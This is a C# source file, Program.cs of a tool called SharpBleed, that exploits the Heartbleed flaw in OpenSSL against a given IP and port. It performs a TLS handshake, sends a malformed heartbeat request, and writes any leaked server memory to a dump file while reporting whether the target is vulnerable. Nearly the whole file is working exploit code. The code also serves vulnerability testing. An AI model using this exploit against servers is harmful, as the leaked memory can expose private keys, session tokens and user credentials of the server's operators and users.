using SharpBleed.Helper;
using System;
using System.Net.Http;
using System.Net.Mime;
using System.Net.Sockets;
using System.Text;
using SharpBleed.Constants;
using System.Net;

namespace SharpBleed
{
    internal class Program
    {
        static string filePath = string.Empty;
        static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: SharpBleed <IP Address> <Port> <File Dump Path>");
                return;
            }

            string ipAddressString = args[0];
            if (!IPAddress.TryParse(ipAddressString, out IPAddress ipAddress))
            {
                Console.WriteLine("Invalid IP address. Please enter a valid IP address.");
                return;
            }

            string portString = args[1];
            if (!int.TryParse(portString, out int port))
            {
                Console.WriteLine("Invalid port number. Please enter a valid port number between 0 and 65535.");
                return;
            }

            filePath = args[2];
            if (string.IsNullOrWhiteSpace(filePath))
            {
                Console.WriteLine("File path cannot be empty. Please enter a valid file path.");
                return;
            }

            try
            {
                using (TcpClient client = new TcpClient(ipAddress.ToString(), port))
                {
                    NetworkStream stream = client.GetStream();

                    Console.WriteLine("Connecting and Sending Client Hello");

                    byte[] hello = HeartbleedHelper.HexStringToByteArray(Packets.helloHex);
                    stream.Write(hello, 0, hello.Length);

                    while (true)
                    {
                        byte[] hdr2 = HeartbleedHelper.ReceiveBytes(client, 5);

                        (byte contentType, ushort version, ushort length) = HeartbleedHelper.UnpackHeader(hdr2);

                        if (hdr2.Length == 5)
                        {
                            byte content_type = hdr2[0];

                            byte[] hand = HeartbleedHelper.ReceiveBytes(client, length);

                            Console.WriteLine($"Received message: type = {content_type}, ver = {version:X4}, length = {length}");

                            if (content_type == 22 && hand[0] == 0x0E)
                            {
                                break;
                            }  
                        }    
                    }

                    Console.WriteLine("Handshake done");

                    HitHeartbeat(client.Client, HeartbleedHelper.HexStringToByteArray(Packets.heartBeatHex), client);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
       
        static bool HitHeartbeat(Socket s, byte[] hb, TcpClient tcpClient)
        {
            s.Send(hb);

            while (true)
            {
                byte[] hdr = HeartbleedHelper.ReceiveBytes(tcpClient, 5);

                if (hdr == null)
                {
                    Console.WriteLine("Unexpected EOF receiving record header - server closed connection");
                    return false;
                }

                (byte contentType, ushort version, ushort length) = HeartbleedHelper.UnpackHeader(hdr);

                if (contentType == 0)
                {
                    Console.WriteLine("No heartbeat response received.");
                    return false;
                }

                byte[] pay = HeartbleedHelper.ReceiveBytes(tcpClient, length);

                if (pay == null)
                {
                    Console.WriteLine("An unexpected EOF occurred while receiving a record payload, indicating that the server abruptly closed the connection.");
                    return false;
                }

                if (contentType == 24)
                {
                    HeartbleedHelper.HexDump(pay, filePath);
                    if (pay.Length > 3)
                    {
                        Console.WriteLine("Server returned more data than it should - server is vulnerable!");
                    }
                    else
                    {
                        Console.WriteLine("The server received a malformed heartbeat, but it did not provide any additional information in response.");
                    }
                    return true;
                }

                if (contentType == 21)
                {
                    Console.WriteLine("Received alert");
                    HeartbleedHelper.HexDump(pay, filePath);
                    Console.WriteLine("Server returned error, likely not vulnerable");
                    return false;
                }
            }
        }
    }
}
